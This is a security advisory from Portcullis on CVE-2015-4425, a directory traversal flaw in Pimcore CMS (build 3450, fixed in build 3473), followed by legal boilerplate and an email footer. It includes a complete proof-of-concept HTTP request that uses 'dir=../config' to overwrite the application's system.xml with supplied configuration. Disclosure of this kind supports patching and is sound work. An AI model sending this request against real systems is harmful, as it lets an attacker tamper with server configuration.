@@ -1,0 +1,118 @@
+Vulnerability title: Directory Traversal/Configuration Update In Pimcore CMS
+CVE: CVE-2015-4425
+Vendor: Pimcore
+Product: Pimcore CMS
+Affected version: Build 3450
+Fixed version: Build 3473
+Reported by: Josh Foote
+Details:
+
+It is possible for an administrative user with the 'assets' permission to overwrite system configuration files via exploiting a directory traversal vulnerability.
+
+The following request can be used to update the ‘system.xml’ file of the web application:
+
+POST /admin/asset/add-asset-compatibility/?parentId=1&dir=../config HTTP/1.1
+Host: pimcore.com
+Connection: keep-alive
+Content-Length: 1502
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: https://www.host.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
+Content-Type: multipart/form-data; boundary=--------2072505619
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
+Cookie: PHPSESSID=nnmupv1knofcpdgjdnivdr4v27; cookie-warn=true; _ga=GA1.2.1941920115.1426505099; pimcore_admin_sid=j79b6ad4afkjimslbj8l5ifuo4
+
+----------2072505619
+Content-Disposition: form-data; name="Filedata"; filename="system.xml" 
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<zend-config xmlns:zf="http://framework.zend.com/xml/zend-config-xml/1.0/">
+  <general>
+    <timezone>Europe/Berlin</timezone>
+    <language>en</language>
+    <validLanguages>en</validLanguages>
+    <debug>1</debug>
+    <debugloglevel>debug</debugloglevel>
+    <custom_php_logfile>1</custom_php_logfile>
+  </general>
+  <database>
+    <adapter>Mysqli</adapter>
+    <params>
+      <username>root</username>
+      <password>PASSWORD</password>
+      <dbname>pimcore</dbname>
+      <host>localhost</host>
+      <port>3306</port>
+    </params>
+  </database>
+  <documents>
+    <versions>
+      <steps>10</steps>
+    </versions>
+    <default_controller>default</default_controller>
+    <default_action>default</default_action>
+    <error_pages>
+      <default>/</default>
+    </error_pages>
+    <createredirectwhenmoved/>
+    <allowtrailingslash>no</allowtrailingslash>
+    <allowcapitals>no</allowcapitals>
+    <generatepreview>1</generatepreview>
+  </documents>
+  <objects>
+    <versions>
+      <steps>10</steps>
+    </versions>
+  </objects>
+  <assets>
+    <versions>
+      <steps>10</steps>
+    </versions>
+  </assets>
+  <services/>
+  <cache>
+    <excludeCookie/>
+  </cache>
+  <httpclient>
+    <adapter>Zend_Http_Client_Adapter_Socket</adapter>
+  </httpclient>
+</zend-config>
+
+
+
+Further details at:
+
+https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2015-4425/
+
+Copyright:
+Copyright (c) Portcullis Computer Security Limited 2015, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of Portcullis Computer Security Limited.
+
+Disclaimer:
+The information herein contained may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user's risk. In no event shall the author/distributor (Portcullis Computer Security Limited) be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information.
+
+
+###############################################################
+This email originates from the systems of Portcullis
+Computer Security Limited, a Private limited company, 
+registered in England in accordance with the Companies 
+Act under number 02763799. The registered office 
+address of Portcullis Computer Security Limited is: 
+Portcullis House, 2 Century Court, Tolpits Lane, Watford, 
+United Kingdom, WD18 9RS.  
+The information in this email is confidential and may be 
+legally privileged. It is intended solely for the addressee. 
+Any opinions expressed are those of the individual and 
+do not represent the opinion of the organisation. Access 
+to this email by persons other than the intended recipient 
+is strictly prohibited.
+If you are not the intended recipient, any disclosure, 
+copying, distribution or other action taken or omitted to be 
+taken in reliance on it, is prohibited and may be unlawful. 
+When addressed to our clients any opinions or advice 
+contained in this email is subject to the terms and 
+conditions expressed in the applicable Portcullis Computer 
+Security Limited terms of business.
+###############################################################
